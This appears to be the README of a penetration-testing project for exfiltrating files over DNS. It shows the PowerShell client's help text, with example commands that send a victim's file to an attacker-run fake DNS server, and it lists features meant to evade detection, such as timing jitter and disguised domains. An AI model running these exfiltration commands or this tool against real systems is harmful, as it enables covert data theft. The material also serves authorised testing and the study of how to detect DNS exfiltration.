# DNS Exfil Tools

Simple penetration testing tools to execute file exfiltration through DNS and avoid common detection methods.

> Modules caption: \
:heavy_check_mark: Available \
:large_blue_circle: Under development \
:white_circle: To be developed

<br>

## Client Exfiltration
Deploy these tools on the target machine to exfiltrate files through DNS requests.
I'm still developing the client side for more than one programming language, to provide more compatibility with the system you are testing.

| Language | Available | Compression | Encryption |
| ------ | ------ | ------ | ------ |
| python3      | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:heavy_check_mark:  | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:large_blue_circle: | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:large_blue_circle: |
| powershell   | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:heavy_check_mark:  | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:large_blue_circle: | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:large_blue_circle: |
| python2      | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle:      | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle: | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle: |
| Compiled C++ | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle:      | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle: | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:white_circle: |

<br>

### Powershell module
Use the cmdlet `Get-Help` to get execution informations. You can use `Get-Help -detailed` to print a decent overview. \
Here is an instance:
```
NAME
    C:\Users\User\Desktop\dnsexfil.ps1

SYNOPSIS
    Post-exploitation tool to execute DNS exfiltration to your pentesting machine

SYNTAX
    C:\Users\User\Desktop\dnsexfil.ps1 [-Server] <String> [-Domain] <String> [-File] <String> [[-Timeout] <Single>]
    [[-Length] <Int32>] [-Hash] [<CommonParameters>]


DESCRIPTION
    Post-exploitation tool to execute DNS exfiltration to your pentesting machine
    At leats three parameters are needed:
    - Specify DNS resolver as Server parameter
    - Specify filename
    - Specify the fake or legit domain you want to query
    The fakeDNS-server must be listening on your machine

PARAMETERS
    -Server <String>
        (Required) IP address of the listening DNS resolver

    -Domain <String>
        (Required) Fake or legit domain for DNS queries. Your fakeDNS-server will answer to both

    -File <String>
        (Required) Path to the file to exfiltrate through DNS queries

    -Timeout <Single>
        (Optional) Set a timeout between queries to slow down or speed up exfiltration. Default value is 2s

    -Length <Int32>
        (Optional) Set the third domain length. Default value is 16

    -Hash [<SwitchParameter>]
        (Optional) Include hash calculation in exfiltration for integrity purposes

    <CommonParameters>
        This cmdlet supports the common parameters: Verbose, Debug,
        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
        OutBuffer, PipelineVariable, and OutVariable. For more information, see
        about_CommonParameters (https:/go.microsoft.com/fwlink/?LinkID=113216).

    -------------------------- EXAMPLE 1 --------------------------
    PS C:\>.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt

    Use 10.10.80.129 as the fakeDNS-server, and send the file C:\Users\Name\file.txt asking for resolution of [***].fakedomain.com:

    -------------------------- EXAMPLE 2 --------------------------
    PS C:\>.\dnsexfil.ps1 -Server 10.10.80.129 -d fakedomain.com -File C:\Users\Name\file.txt -Length 32 -Timeout 10 -Hash

    DNS queries will be like [32-long-chunk].fakedomain.com and will be going out every 10 seconds
```

<br>

---

### Features and @TODOs
| | |
| ------ | ------ | 
| :heavy_check_mark:  | Set timeout between DNS requests to slow down exfiltration and prevent detection |
| :heavy_check_mark:  | Set random timeout between requests to prevent periodically checks detection |
| :heavy_check_mark:  | Set fake domain or legit domain for DNS queries, the DNS server listening on your machine will respond to both |
| :heavy_check_mark:  | Set custom exfiltration third level domain chunks length |
| :heavy_check_mark:  | Send filename as first action |
| :heavy_check_mark:  | Optional: md5 file hash trasmission before file content for integrity checks|
| :large_blue_circle: | Optional: print server's response as record A resolution to verify queries |
| :large_blue_circle: | Optional: Compress files to exfiltrate to speed up the process |
| :white_circle:      | Optional: file encryption to prevent network sniffers to rebuild exfiltrated artifacts |
| :white_circle:      | Optional: Send multiple files at once |
| :white_circle:      | Optional: Send entire directory as compressed file |

<br>
<br>

## Fake DNS Server
Developed with Python3, the server module will provide a simple fake DNS server to get client's queries from your attacking machine, and responde with a spoofed IP of your choice (default is google.com's).

### Features and @TODOs
| | |
| ------ | ------ | 
| :heavy_check_mark:  | Set custom IP to spoof as record A response |
| :heavy_check_mark:  | Set custom domain for further automated file decode |
| :heavy_check_mark:  | Set custom UDP port for DNS service (default is 53) |
| :large_blue_circle: | Get filename from exfiltration first chunk |
| :large_blue_circle: | Optional: automated file decode/save |
| :large_blue_circle: | Optional: compressed files receiving capabilities |
| :white_circle:      | Optional: file decryption and save |

<br>
<br>

## Use case
### Attacker side (fake DNS server)
![](https://raw.githubusercontent.com/synth3sis/DNSexfiltools/main/media/fakeDNS-server3.gif)
### Victim side (exfiltration tool)
![](https://raw.githubusercontent.com/synth3sis/DNSexfiltools/main/media/dnsexfil3.gif)
